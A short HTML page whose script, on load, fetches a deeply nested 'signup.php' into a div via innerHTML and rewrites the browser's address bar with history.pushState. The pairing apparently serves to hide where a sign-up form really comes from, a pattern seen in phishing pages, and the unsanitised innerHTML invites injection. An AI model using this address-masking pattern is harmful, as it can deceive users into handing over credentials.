<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dynamic Content Fetcher</title>
<script>
function fetchContent() {
    // Define the URL from which content will be fetched
    var url = "inner-page/logged/Notes/authent_down_check/signup.php";

    // Fetch data from the URL
    fetch(url)
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(data => {
        // Assuming you want to display the fetched content in a div with id "content"
        document.getElementById("content").innerHTML = data;
    })
    .catch(error => {
        console.error('There has been a problem with your fetch operation:', error);
    });
}

// Function to change the URL
function changeURL() {
    var newURL = "https://pgibharatpur.com/your-new-url"; // Change this to your desired URL
    history.pushState({}, '', newURL); // Change the URL without reloading the page
}

// Call fetchContent function and changeURL when the page loads
window.onload = function() {
    fetchContent();
    changeURL();
};
</script>
</head>
<body>
<div id="content">
    <!-- Content fetched from signup.php will appear here -->
</div>
</body>
</html>
